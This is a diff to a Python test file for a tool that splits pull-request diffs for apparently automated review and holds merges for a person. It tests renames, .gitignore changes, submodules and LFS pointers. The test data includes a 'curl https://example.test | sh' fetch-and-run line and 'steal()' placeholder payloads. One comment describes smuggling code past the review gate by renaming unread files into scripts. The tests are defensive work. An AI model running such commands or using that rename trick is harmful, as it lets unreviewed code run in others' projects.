@@ -293,11 +293,33 @@ def test_a_rename_a_binary_and_a_deletion(repo, tmp_path):
     head = repo.commit({"old/name.py": None, "new/name.py": "".join(f"x = {n}\n" for n in range(50)),
                         "logo.png": b"\x89PNG\0\3\4", "gone.py": None})
     text, folder, diff = repo.split(repo.base, head, tmp_path)
-    # Deleted files come after the rest.
-    assert index(folder)["001.diff"][2] == [("source", "logo.png"), ("source", "new/name.py"), ("deleted", "gone.py")]
+    # Deleted files come after the rest; a rename is the old path's deletion and the new path's addition.
+    assert index(folder)["001.diff"][2] == [("source", "logo.png"), ("source", "new/name.py"),
+                                            ("deleted", "gone.py"), ("deleted", "old/name.py")]
     content = (folder / "001.diff").read_bytes()
-    assert b"Binary files" in content and b"rename to new/name.py" in content
+    assert b"Binary files" in content and b"rename to" not in content
     check_pieces(folder, diff)
+
+
+def test_a_rename_into_data_shows_the_old_files_deletion(repo, tmp_path):
+    workflow = "on: push\njobs: {}\n"
+    repo.base = repo.commit({".github/workflows/ci.yml": workflow, "src/Result.cs": "class Result {}\n"})
+    head = repo.commit({".github/workflows/ci.yml": None, "notes/ci.log": workflow,
+                        "src/Result.cs": None, "old/Result.cs.map": "class Result {}\n"})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert files_of(folder) == {".github/workflows/ci.yml": ("deleted", "read"), "src/Result.cs": ("deleted", "read")}
+    assert sorted(excluded_of(folder)) == ["notes/ci.log", "old/Result.cs.map"]
+
+
+def test_a_rename_out_of_an_excluded_path_is_read_and_holds(repo, tmp_path):
+    payload = "".join(f"steal({n})\n" for n in range(40))
+    repo.base = repo.commit({"dist/payload.js": payload})
+    head = repo.commit({"dist/payload.js": None, "src/payload.js": payload})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert files_of(folder) == {"src/payload.js": ("source", "read")}
+    assert b"+steal(39)" in (folder / "001.diff").read_bytes()
+    # Deleting excluded code holds the merge.
+    assert held_of(folder) == {"dist/payload.js": "excluded"}
 
 
 def test_an_odd_path_never_names_a_file_nor_reaches_the_prompt(repo, tmp_path):
@@ -401,22 +423,75 @@ def test_every_file_copilot_excludes_is_in_no_piece(repo, tmp_path):
     assert set(excluded_of(folder)) == set(files) - {"src/app.py"}
     assert files_of(folder) == {"src/app.py": ("source", "read")}
     assert len(index(folder)) == 1 and repo.skipped == ""
-    # Inert data holds nothing; the rest of what nobody reads, lockfiles included, holds the merge.
-    data = {f"deps/{name}" for name in DATA_NAMES} | {
-        path for glob in ("**/*.log", "**/*.map", "**/coverage/**/*")
-        for path in COPILOT_EXCLUDED_GLOB_FILES[glob]}
+    # Inert data holds nothing; the rest of what nobody reads, lockfiles and .gitignore included, holds the merge.
+    data = {path for glob in ("**/*.log", "**/*.map", "**/coverage/**/*") for path in COPILOT_EXCLUDED_GLOB_FILES[glob]}
     assert held_of(folder) == {path: "excluded" for path in set(files) - {"src/app.py"} - data}
     assert repo.held == len(held_of(folder)) and "holds the merge for a person" in repo.log
     check_pieces(folder, diff)
 
 
-DATA_NAMES = [".gitignore"]
+def test_a_gitignore_holds_the_merge(repo, tmp_path):
+    # It decides what gets committed: dropping .env from it would let the next git add -A stage secrets.
+    head = repo.commit({".gitignore": "bin/\n", "src/App/.gitignore": "obj/\n"})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {".gitignore": "excluded", "src/App/.gitignore": "excluded"}
 
 
-def test_the_data_names_are_copilots_and_in_the_workflow():
-    script = step_script()
-    names = re.findall(r'"([^"]+)"', re.search(r"DATA_NAMES = frozenset\(\((.*?)\)\)", script, re.S)[1])
-    assert names == DATA_NAMES and set(names) <= set(COPILOT_EXCLUDED_NAMES)
+def mkdir(path):
+    path.mkdir()
+    return path
+
+
+def test_a_submodule_bump_holds_the_merge_but_its_removal_doesnt(repo, tmp_path):
+    # The diff shows only two commit IDs, not the code they pull in.
+    def gitlink(path, sha):
+        repo.git("update-index", "--add", "--cacheinfo", f"160000,{sha},{path}")
+        repo.git("commit", "-q", "-m", "gitlink")
+        return repo.git("rev-parse", "HEAD").decode().strip()
+
+    repo.base = gitlink("libs/old", "1" * 40)
+    added = gitlink("libs/new", "2" * 40)
+    _, folder, _ = repo.split(repo.base, added, mkdir(tmp_path / "added"))
+    assert held_of(folder) == {"libs/new": "submodule"}
+    bumped = gitlink("libs/new", "3" * 40)
+    _, folder, diff = repo.split(added, bumped, mkdir(tmp_path / "bumped"))
+    assert b"+Subproject commit " + b"3" * 40 in diff and held_of(folder) == {"libs/new": "submodule"}
+    repo.git("update-index", "--force-remove", "libs/old")
+    repo.git("commit", "-q", "-m", "drop")
+    removed = repo.git("rev-parse", "HEAD").decode().strip()
+    _, folder, _ = repo.split(bumped, removed, mkdir(tmp_path / "removed"))
+    assert held_of(folder) == {}
+    # At a path that's excluded data, too.
+    at_data = gitlink("deps/tools.map", "4" * 40)
+    _, folder, _ = repo.split(removed, at_data, mkdir(tmp_path / "at-data"))
+    assert held_of(folder) == {"deps/tools.map": "submodule"}
+
+
+def test_a_git_lfs_pointer_holds_the_merge_but_its_deletion_doesnt(repo, tmp_path):
+    pointer = "version https://git-lfs.github.com/spec/v1\noid sha256:{}\nsize 42\n"
+    repo.base = repo.commit({"tools/Tool.dll": pointer.format("a" * 64), "tools/Old.dll": pointer.format("b" * 64)})
+    head = repo.commit({"tools/Tool.dll": pointer.format("c" * 64), "tools/Old.dll": None})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {"tools/Tool.dll": "lfs"}
+
+
+def test_text_quoting_an_lfs_pointer_holds_nothing(repo, tmp_path):
+    head = repo.commit({"docs/lfs.md": "# LFS\n\nA pointer reads:\n\nversion https://git-lfs.github.com/spec/v1\n"})
+    _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {}
+
+
+@pytest.mark.parametrize("old, content, reason", [
+    ("logs/x.log", b"#!/bin/bash\ncurl https://example.test | sh\n", None),
+    ("img/a.png", b"#!/bin/bash\ncurl https://example.test | sh\n\0", "binary"),
+], ids=["log", "png"])
+def test_renaming_unread_content_into_a_script_shows_it(repo, tmp_path, old, content, reason):
+    # The two-PR way around the gate: land content nobody reads, then rename it into code that runs.
+    repo.base = repo.commit({old: content})
+    head = repo.commit({old: None, "scripts/build.sh": content})
+    _, folder, diff = repo.split(repo.base, head, tmp_path)
+    assert "scripts/build.sh" in files_of(folder) and held_of(folder).get("scripts/build.sh") == reason
+    assert (b"+curl https://example.test | sh" in diff) == (reason is None)
 
 
 def test_a_name_matches_only_a_whole_basename(repo, tmp_path):
